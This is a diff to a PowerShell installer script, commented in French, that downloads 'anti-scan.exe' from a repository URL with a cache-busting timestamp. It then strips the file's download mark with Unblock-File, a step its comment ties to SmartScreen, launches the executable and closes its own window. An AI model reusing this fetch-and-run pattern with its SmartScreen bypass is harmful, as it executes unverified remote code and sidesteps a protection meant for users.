@@ -10,19 +10,18 @@ try {
 } catch {}
 Start-Sleep -Milliseconds 500
 
-# 2. Preparer le repertoire de destination specifique
+# 2. Preparer le repertoire (TOUJOURS creer si absent)
 try {
-    if (Test-Path $installDir) {
+    $null = New-Item -ItemType Directory -Force -Path $installDir
+    if (Test-Path $exePath) {
         Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
-    } else {
-        $null = New-Item -ItemType Directory -Force -Path $installDir
     }
 } catch {}
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $downloaded = $false
 
-# 3. Telechargement (Cache Bypass)
+# 3. Telechargement (Cache Bypass via timestamp)
 $cacheBuster = [DateTimeOffset]::Now.ToUnixTimeSeconds()
 $downloadUrl = "$REPO_URL/anti-scan.exe?v=$cacheBuster"
 
@@ -53,16 +52,14 @@ if (-not $downloaded) { exit 1 }
 # 4. Debloquer le fichier (Zone.Identifier / SmartScreen)
 try { Unblock-File -Path $exePath -ErrorAction SilentlyContinue } catch {}
 
-# 5. Lancement de l'EXE de scan dans sa propre fenetre
+# 5. Lancement de l'EXE dans sa propre fenetre visible
 try {
-    Start-Process -FilePath $exePath
+    Start-Process -FilePath $exePath -WindowStyle Normal
 } catch {
-    try {
-        & "$exePath"
-    } catch {}
+    try { & "$exePath" } catch {}
 }
 
-# 6. Fermer la fenetre PowerShell d'installation d'origine
+# 6. Fermer cette fenetre PowerShell
 try {
     Stop-Process -Id $PID -Force
 } catch {
